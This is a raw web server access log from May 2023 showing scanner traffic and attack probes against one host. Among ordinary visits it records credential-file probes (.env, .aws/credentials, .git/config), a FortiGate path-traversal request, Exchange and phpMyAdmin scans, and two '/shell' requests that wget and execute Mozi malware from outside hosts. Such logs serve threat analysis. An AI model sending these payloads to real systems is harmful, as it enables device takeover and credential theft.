3.138.111.203 - - [19/May/2023:10:08:33 -0400] "GET /.well-known/acme-challenge/KF72B58eF_rmJlr-ANpis7vctHKtKuYahVLat0VI454 HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
193.42.32.124 - - [20/May/2023:12:24:47 -0400] "POST /boaform/admin/formLogin HTTP/1.1" 404 196 "http://23.92.219.236:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
109.74.199.205 - - [20/May/2023:12:30:13 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
109.74.199.205 - - [20/May/2023:12:30:13 -0400] "\x16\x03\x01" 400 226 "-" "-"
109.74.199.205 - - [20/May/2023:12:30:14 -0400] "\x16\x03\x01" 400 226 "-" "-"
109.74.199.205 - - [20/May/2023:12:30:14 -0400] "\x16\x03\x01" 400 226 "-" "-"
151.247.21.53 - - [20/May/2023:12:36:12 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
87.236.176.68 - - [20/May/2023:12:45:10 -0400] "GET / HTTP/1.1" 301 238 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
87.236.176.68 - - [20/May/2023:12:45:11 -0400] "GET / HTTP/1.1" 200 53859 "http://sb236.cryptoland.host" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
87.236.176.217 - - [20/May/2023:12:45:12 -0400] "GET /favicon.ico HTTP/2.0" 404 196 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
68.183.53.77 - - [20/May/2023:12:45:13 -0400] "GET /favicon.ico HTTP/2.0" 404 196 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
192.42.116.179 - - [20/May/2023:12:45:14 -0400] "GET /favicon.ico HTTP/2.0" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
46.98.111.67 - - [20/May/2023:12:45:31 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
170.130.165.29 - - [20/May/2023:13:00:00 -0400] "\x16\x03\x01\x01\x07\x01" 400 226 "-" "-"
170.130.165.29 - - [20/May/2023:13:00:00 -0400] "\x16\x03\x01\x01\x07\x01" 400 226 "-" "-"
170.130.165.29 - - [20/May/2023:13:00:00 -0400] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 - github.com/anasbousselham/)"
170.130.165.29 - - [20/May/2023:13:00:00 -0400] "POST /owa/auth.owa HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
170.130.165.29 - - [20/May/2023:13:00:00 -0400] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 - github.com/anasbousselham/)"
152.89.196.144 - - [20/May/2023:13:16:56 -0400] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
162.243.140.44 - - [20/May/2023:13:23:30 -0400] "GET /owa/auth/logon.aspx HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
198.199.117.207 - - [20/May/2023:13:26:03 -0400] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
162.243.147.28 - - [20/May/2023:13:26:43 -0400] "GET /owa/auth/x.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
45.83.65.60 - - [20/May/2023:14:03:45 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
45.83.66.49 - - [20/May/2023:14:03:48 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
192.155.90.118 - - [20/May/2023:14:11:40 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
172.104.11.4 - - [20/May/2023:14:18:40 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
152.89.196.144 - - [20/May/2023:14:58:38 -0400] "GET /actuator/gateway/routes HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
94.102.61.90 - - [20/May/2023:15:00:23 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
167.248.133.125 - - [20/May/2023:15:12:59 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.125 - - [20/May/2023:15:12:59 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
140.238.69.139 - - [20/May/2023:15:38:51 -0400] "GET /.env HTTP/1.1" 404 196 "-" "-"
140.238.69.139 - - [20/May/2023:15:38:53 -0400] "GET /_profiler/phpinfo HTTP/1.1" 404 196 "-" "-"
140.238.69.139 - - [20/May/2023:15:38:54 -0400] "GET /phpinfo HTTP/1.1" 404 196 "-" "-"
140.238.69.139 - - [20/May/2023:15:38:55 -0400] "GET /phpinfo.php HTTP/1.1" 404 16 "-" "-"
140.238.69.139 - - [20/May/2023:15:38:56 -0400] "GET /info.php HTTP/1.1" 404 16 "-" "-"
140.238.69.139 - - [20/May/2023:15:38:57 -0400] "GET /php.php HTTP/1.1" 404 16 "-" "-"
140.238.69.139 - - [20/May/2023:15:38:58 -0400] "GET /test.php HTTP/1.1" 404 16 "-" "-"
109.237.98.226 - - [20/May/2023:15:56:28 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
109.237.98.226 - - [20/May/2023:15:56:28 -0400] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
194.180.48.85 - - [20/May/2023:16:21:25 -0400] "POST /boaform/admin/formLogin HTTP/1.1" 404 196 "http://23.92.219.236:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
159.89.36.173 - - [20/May/2023:16:26:07 -0400] "GET /ab2g HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
159.89.36.173 - - [20/May/2023:16:26:08 -0400] "GET /ab2h HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
159.89.36.173 - - [20/May/2023:16:26:10 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.89.36.173 - - [20/May/2023:16:26:10 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
159.89.36.173 - - [20/May/2023:16:26:10 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
159.89.36.173 - - [20/May/2023:16:26:11 -0400] "GET /t4 HTTP/1.1" 404 196 "-" "Mozilla/5.0"
159.89.36.173 - - [20/May/2023:16:26:11 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
78.128.113.38 - - [20/May/2023:16:45:03 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36"
78.128.113.38 - - [20/May/2023:16:45:04 -0400] "GET /portal/webclient/index.html HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
179.43.177.244 - - [20/May/2023:16:55:12 -0400] "GET / HTTP/1.1" 200 53859 "-" "Hello World"
18.212.3.249 - - [20/May/2023:16:59:24 -0400] "GET /.git/config HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
45.227.254.48 - - [20/May/2023:17:26:39 -0400] "\x03" 400 226 "-" "-"
179.43.177.244 - - [20/May/2023:17:32:17 -0400] "GET / HTTP/1.1" 200 53859 "-" "Hello World"
46.147.35.56 - - [20/May/2023:17:36:19 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
193.35.18.61 - - [20/May/2023:17:42:03 -0400] "GET / HTTP/1.1" 200 53859 "-" "-"
193.35.18.61 - - [20/May/2023:17:42:04 -0400] "POST /HNAP1/ HTTP/1.1" 404 196 "-" "Mozila/5.0"
79.124.58.130 - - [20/May/2023:18:08:24 -0400] "GET / HTTP/1.1" 200 53859 "-" "Go-http-client/1.1"
45.76.169.76 - - [20/May/2023:18:16:58 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15"
159.223.136.180 - - [20/May/2023:18:27:21 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
34.78.249.41 - - [20/May/2023:18:30:45 -0400] "GET / HTTP/1.1" 200 53859 "-" "python-requests/2.28.2"
198.199.115.80 - - [20/May/2023:18:50:54 -0400] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
45.87.9.28 - - [20/May/2023:19:10:45 -0400] "GET / HTTP/1.1" 301 238 "-" "Mozilla/5.0 (iPad; CPU OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
45.87.9.60 - - [20/May/2023:19:10:46 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (iPad; CPU OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
179.43.177.244 - - [20/May/2023:20:08:05 -0400] "POST /boaform/admin/formLogin HTTP/1.1" 404 196 "http://23.92.219.236:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
18.212.3.249 - - [20/May/2023:20:10:19 -0400] "GET /.aws/credentials HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2"
168.205.38.39 - - [20/May/2023:20:57:36 -0400] "GET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws HTTP/1.1" 404 196 "-" "Hello, world"
194.180.48.85 - - [20/May/2023:21:21:13 -0400] "POST /boaform/admin/formLogin HTTP/1.1" 404 196 "http://23.92.219.236:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
193.42.32.124 - - [20/May/2023:21:23:45 -0400] "POST /web_shell_cmd.gch HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
193.42.32.124 - - [20/May/2023:21:23:45 -0400] "POST /web_shell_cmd.gch HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
193.42.32.124 - - [20/May/2023:21:23:46 -0400] "POST /web_shell_cmd.gch HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
64.62.197.29 - - [20/May/2023:21:28:34 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
64.62.197.27 - - [20/May/2023:21:34:46 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
92.255.85.152 - - [20/May/2023:21:35:06 -0400] "\x03" 400 226 "-" "-"
64.62.197.23 - - [20/May/2023:21:35:43 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
64.62.197.26 - - [20/May/2023:21:37:34 -0400] "GET /geoserver/web/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0"
64.62.197.25 - - [20/May/2023:21:38:06 -0400] "GET /.git/config HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; rv:108.0) Gecko/20100101 Firefox/108.0"
18.212.3.249 - - [20/May/2023:21:54:52 -0400] "GET /.git/config HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 11; 100011886A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/sqlweb/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/MyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/php/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/mysqlmanager/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/sqlmanager/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpMyAdmin-2.5.4/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/mysql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpMyAdmin3/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/websql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/admin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/db/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/admin/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/mysqladmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpMyAdmin-2/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpMyAdmin-2.8.0.2/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpmyadmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpmy-admin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/_phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpMyAdmin-2.5.5/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/webadmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/PHPMYADMIN/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/myadmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/php-myadmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/mysql-admin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpMyAdmin-2.11.3/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpMyAdmin2/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpmanager/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/web/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/dbadmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/SQL/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpMyAdmin-2.11.0/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:24 -0400] "GET http://23.92.219.236:80/webdb/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:25 -0400] "GET http://23.92.219.236:80/phpMyAdmin-2.5.7-pl1/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:25 -0400] "GET http://23.92.219.236:80/phpMyAdmin-2.11.7/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:25 -0400] "GET http://23.92.219.236:80/admin/phpmyadmin/scripts/setup.txt HTTP/1.0" 404 196 "-" "-"
152.136.235.236 - - [20/May/2023:22:08:26 -0400] "GET http://23.92.219.236:80/phpMyAdmin-2.5.5-pl1/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
198.235.24.227 - - [20/May/2023:22:25:10 -0400] "\x16\x03\x01" 400 226 "-" "-"
65.49.20.66 - - [20/May/2023:22:26:54 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0"
65.49.20.66 - - [20/May/2023:22:28:39 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
65.49.20.66 - - [20/May/2023:22:29:28 -0400] "GET /geoserver/web/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0"
79.124.59.170 - - [20/May/2023:22:36:42 -0400] "GET / HTTP/1.0" 200 53859 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
18.212.3.249 - - [20/May/2023:22:46:38 -0400] "GET /.svn/wc.db HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36"
162.243.139.23 - - [20/May/2023:23:43:12 -0400] "MGLNDD_23.92.219.236_80\n" 400 226 "-" "-"
117.36.199.38 - - [20/May/2023:23:55:28 -0400] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://117.36.199.38:52528/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 196 "-" "Hello, world"
198.235.24.43 - - [20/May/2023:23:58:20 -0400] "GET / HTTP/1.0" 301 238 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
152.89.196.144 - - [21/May/2023:00:26:18 -0400] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
35.233.62.116 - - [21/May/2023:01:27:35 -0400] "GET / HTTP/1.1" 200 53859 "-" "python-requests/2.28.2"
103.178.229.217 - - [21/May/2023:01:44:39 -0400] "GET / HTTP/1.1" 200 53859 "-" "Linux Gnu (cow)"
109.237.97.180 - - [21/May/2023:02:20:12 -0400] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [21/May/2023:02:20:12 -0400] "\x16\x03\x01\x01H\x01" 400 226 "-" "-"
152.89.196.144 - - [21/May/2023:02:24:23 -0400] "GET /actuator/gateway/routes HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
85.217.144.217 - - [21/May/2023:02:29:23 -0400] "GET /.env HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
85.217.144.217 - - [21/May/2023:02:29:23 -0400] "POST / HTTP/1.1" 200 53859 "-" "python-requests/2.28.1"
128.14.141.34 - - [21/May/2023:03:16:23 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
165.154.128.222 - - [21/May/2023:03:36:27 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
165.154.128.222 - - [21/May/2023:03:36:36 -0400] "GET / HTTP/1.1" 200 53859 "-" "curl/7.29.0"
162.142.125.225 - - [21/May/2023:03:45:58 -0400] "GET / HTTP/1.1" 200 53859 "-" "-"
162.142.125.225 - - [21/May/2023:03:45:58 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.225 - - [21/May/2023:03:45:59 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
152.32.174.92 - - [21/May/2023:03:46:29 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/552.51 (KHTML, like Gecko) Chrome/103.0.888 Safari/537.36"
152.32.174.92 - - [21/May/2023:03:46:32 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 9_0_2) AppleWebKit/563.38 (KHTML, like Gecko) Chrome/77.0.1104 Safari/537.36"
152.32.174.92 - - [21/May/2023:03:46:32 -0400] "GET /global/dialog.js HTTP/1.1" 200 7476 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/588.39 (KHTML, like Gecko) Chrome/59.0.447 Safari/537.36"
152.32.174.92 - - [21/May/2023:03:46:32 -0400] "GET /assets/js/plugins/isotope.pkg.min.js HTTP/1.1" 200 35456 "-" "Mozilla/5.0 (Windows NT 7_1_2; Win64; x64) AppleWebKit/601.39 (KHTML, like Gecko) Chrome/52.0.764 Safari/537.36"
152.32.174.92 - - [21/May/2023:03:46:32 -0400] "GET /global/functions.js HTTP/1.1" 200 12046 "-" "Mozilla/5.0 (Windows NT 8_2_2; Win64; x64) AppleWebKit/595.54 (KHTML, like Gecko) Chrome/74.0.2895 Safari/537.36"
152.32.174.92 - - [21/May/2023:03:46:34 -0400] "GET /assets/js/plugins/jquery.slick.min.js HTTP/1.1" 200 42664 "-" "Mozilla/5.0 (Windows NT 7_2; Win64; x64) AppleWebKit/562.52 (KHTML, like Gecko) Chrome/67.0.2144 Safari/537.36"
